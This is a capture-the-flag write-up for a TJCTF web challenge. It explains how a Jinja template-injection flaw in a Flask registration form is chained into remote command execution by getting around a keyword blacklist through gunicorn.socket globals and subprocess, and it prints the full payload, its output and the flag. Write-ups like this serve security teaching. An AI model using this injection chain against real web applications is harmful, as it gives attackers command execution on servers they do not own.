# Congenial-Octo-Couscous
Web, 70

>  Written by avz92
>  Team Congenial-Octo-Couscous is looking to replace one of its members for the Battlecode competition, who carried the team too hard and broke his back. Until a neural net can take his place, the team wants a 4th member. Figure out how to join the team and read the secret strategy guide to get the flag. 

When we try to register an account, it echos our username. If we enter `{{config}}` as our username, we get the config variables. One stands out in particular: `"SERVER_FILEPATH": "/secretserverfile.py"`. We use this to find the [source](https://congenial_octo_couscous.tjctf.org/secretserverfile.py). Essentially, we have to use template injection to get RCE, but there is a blacklist of `['"', 'class', '[', ']', 'dict', 'sys', 'os', 'eval', 'exec', 'config.']`.

Python functions objects have very handy `__globals__` properties with lots of stuff in them. Messing around with `flask` locally lets us identify a function that has the `os` module in its globals:

```
request.environ['gunicorn.socket'].dup.__func__.__globals__
```

Since we can't use square brackets, we instead call `__getitem__`, and use `subprocess.check_output` to get the output of arbitrary code:

```python
>>> import html, requests
>>> print(eval(html.unescape(requests.post("https://congenial_octo_couscous.tjctf.org/apply", data="fname=&lname=&email=&username={{request.environ.__getitem__('gunicorn.socket').dup.__func__.__globals__.__getitem__('o''s').__builtins__.__getitem__('__import__')('subprocess').check_output(('bash','-c','cat strategyguide.txt'))}}", headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}).text)[7:-48]).decode())
Best formation that wins every time:
DDDDD
DLLLD
DLHLD
DLLLD
DDDDD

Key:
D=Drone
L=Landscaper
H=HQ

Beginning of game strategy:
tjctf{c0ng3n1al_500iq_str4ts_ez_dub}
```

Flag: `tjctf{c0ng3n1al_500iq_str4ts_ez_dub}`